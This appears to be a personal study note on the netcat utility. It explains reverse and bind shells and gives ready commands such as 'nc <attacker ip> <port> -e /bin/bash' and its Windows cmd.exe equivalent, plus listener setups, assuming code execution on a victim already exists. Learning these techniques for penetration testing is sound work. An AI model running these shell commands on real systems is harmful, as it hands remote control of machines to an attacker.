[Netcat](https://nc110.sourceforge.io/) is a [[Linux]] Command-line Interface (CLI) Based Swiss Army knife tool that is use to read/write data over TCP/UDP. It is a [Back-End](https://en.wikipedia.org/wiki/Front_end_and_back_end) tool which can smoothly be cross utilized by other programs.

The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.


***Reverse Shell***

A reverse shell is initiating a shell session on a remote target (victim) machine to an attacker machine. The attacker is listening to a specific port from the target
![[Pasted image 20240915123945.png]]

***Bind Shell

A bind shell is a shell session initiated from the attacker machine to a remote target (victim) machine. The target machine opens up a specified port, from which the attacker is listening to.

![[Pasted image 20240915124356.png]]

Usage: This supposed you already have access to the target's machine by any [[Remote Code Execution]] mean.

***Reverse Shell Use case***
On the attacker's  machine
```
nc -lvp <port>
nc -lvp 4444
```
- l listening mode
- v verbose
- p port integer number to listen to

On the target [[Linux]] machine
```
nc <attacker ip> <port> -e /bin/bash
nc 10.0.2.15 4444 -e /bin/bash
```

On target [[Windows]] machine
```
nc.exe <attacker-ip> <port> -e cmd.exe
nc 10.0.2.15 4444 -e cmd.exe
```

***Bind Shell Use case***
On the victim's machine (target)
```
nc –lvp <bind-port-number> -e /bin/bash
nc -lvp 5555 -e /bin/bash
```

On the attacker's machine
```
nc <victim-IP> <Binded-port>
nc 10.0.2.6 5555
```

This command is also referred as "ncat"


More:
https://www.infosecademy.com/netcat-reverse-shells/


